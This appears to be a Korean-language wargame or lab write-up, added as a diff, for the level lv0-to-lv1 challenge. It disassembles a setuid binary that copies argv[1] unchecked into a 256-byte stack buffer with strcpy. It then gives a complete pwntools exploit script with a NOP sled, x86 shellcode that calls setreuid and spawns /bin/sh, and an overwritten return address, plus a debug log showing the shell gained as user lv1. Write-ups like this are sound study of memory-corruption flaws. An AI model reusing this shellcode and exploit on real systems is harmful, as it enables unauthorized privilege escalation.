@@ -1,0 +1,79 @@
+# Lv0 -> Lv1
+## lv1
+gdb를 이용해 lv1 바이너리를 분석해 보면 다음과 같다.
+
+
+* main
+```asm
+   0x08048430 <+0>:	push ebp
+   0x08048431 <+1>:	mov ebp, esp
+   0x08048433 <+3>:	sub esp, 0x100                          ; buf : 0x100bytes
+   0x08048439 <+9>:	cmp dword ptr [ebp + 8], 1		; [ebp + 8] : argc 
+   0x0804843d <+13>:	jg main+38 			        ; 1보다 크면 main+38로 jmp
+```
+
+
+* main+38
+```asm
+   0x08048456 <+38>:	mov eax, dword ptr [ebp+0xc]		; eax에 argv[0]주소 mov
+   0x08048459 <+41>:	add eax, 4				; eax에 argv[1] 주소
+   0x0804845c <+44>:	mov edx, dword ptr [eax]		; edx에 eax값 mov
+   0x0804845e <+46>:	push edx				; edx값을 스택에 push
+   0x0804845f <+47>:	lea eax, [ebp - 0x100]		        ; eax에 buf 주소 복사
+   0x08048465 <+53>:	push eax				; 스택에 eax값 push
+   0x08048466 <+54>:	call strcpy@plt			        ; strcpy(buf, argv[1]);
+
+```
+
+즉 buf에 NOP을 포함한 쉘코드를 넣어두고, ret을 buf 초반부분으로 지정해주면 된다.
+
+## exploit.py
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+argv = "\x90"*186 + "\x66\xb8\xe9\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" 
+			+ "\x90"*36 + p32(0xffffd058)
+
+p = process(['./lv1', argv])
+if p.poll() == None:
+    p.sendline('id')
+    p.recv()
+    p.sendline('my-pass')
+    p.recv()
+    p.interactive()
+```
+------
+
+```
+lv0@ubuntu:~$ python exploit.py 
+[+] Starting local process './lv1' argv=['./lv1', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90f\xb8\xe9\x03\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x99\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90X\xd0\xff\xff'] : pid 9285
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x181 bytes:
+    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+    *
+    000000b0  90 90 90 90  90 90 90 90  90 90 66 b8  e9 03 89 c3  │····│····│··f·│····│
+    000000c0  89 c1 31 c0  b0 46 cd 80  31 c0 50 68  2f 2f 73 68  │··1·│·F··│1·Ph│//sh│
+    000000d0  68 2f 62 69  6e 89 e3 50  53 89 e1 99  b0 0b cd 80  │h/bi│n··P│S···│····│
+    000000e0  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+    *
+    00000100  90 90 90 90  58 d0 ff ff  0a 75 69 64  3d 31 30 30  │····│X···│·uid│=100│
+    00000110  31 28 6c 76  31 29 20 67  69 64 3d 31  30 30 30 28  │1(lv│1) g│id=1│000(│
+    00000120  6c 76 30 29  20 67 72 6f  75 70 73 3d  31 30 30 30  │lv0)│ gro│ups=│1000│
+    00000130  28 6c 76 30  29 2c 34 28  61 64 6d 29  2c 32 34 28  │(lv0│),4(│adm)│,24(│
+    00000140  63 64 72 6f  6d 29 2c 32  37 28 73 75  64 6f 29 2c  │cdro│m),2│7(su│do),│
+    00000150  33 30 28 64  69 70 29 2c  34 36 28 70  6c 75 67 64  │30(d│ip),│46(p│lugd│
+    00000160  65 76 29 2c  31 31 36 28  6c 70 61 64  6d 69 6e 29  │ev),│116(│lpad│min)│
+    00000170  2c 31 32 36  28 73 61 6d  62 61 73 68  61 72 65 29  │,126│(sam│bash│are)│
+    00000180  0a                                                  │·│
+    00000181
+[DEBUG] Sent 0x8 bytes:
+    'my-pass\n'
+[DEBUG] Received 0xe bytes:
+    'hello newbie!\n'
+[*] Switching to interactive mode
+$  
+```
